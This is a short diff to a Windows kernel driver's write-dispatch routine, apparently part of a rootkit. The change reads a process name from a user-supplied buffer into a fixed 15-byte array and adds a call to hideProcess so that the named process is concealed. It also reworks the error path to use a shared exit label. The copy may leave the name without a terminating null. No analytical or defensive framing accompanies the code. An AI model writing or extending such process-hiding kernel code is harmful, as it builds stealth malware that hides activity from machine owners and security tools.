@@ -212,10 +212,10 @@ MyWriteDispatch(
 	PIO_STACK_LOCATION irpsp;
 	NTSTATUS status = STATUS_SUCCESS;
 	ULONG information = 0;
-	PVOID buffer = NULL;
+	PCHAR buffer;
 	ULONG bufferLen;
 
-	PWCHAR name;
+	CHAR name[15];
 
 	UNREFERENCED_PARAMETER(DeviceObject);
 
@@ -225,15 +225,16 @@ MyWriteDispatch(
 	buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, LowPagePriority);
 	if (buffer == NULL) {
 		status = STATUS_UNSUCCESSFUL;
-		Irp->IoStatus.Status = status;
-		Irp->IoStatus.Information = bufferLen;
-		IoCompleteRequest(Irp, IO_NO_INCREMENT);
-		return status;
+		information = 0;
+		goto ret;
 	}
 
-	buffer = readBuffer(buffer, &name, bufferLen);
+	readBuffer(buffer, name, min(bufferLen, 15));
+	hideProcess(name);
+	
 	information = bufferLen;
 
+ret:
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = information;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
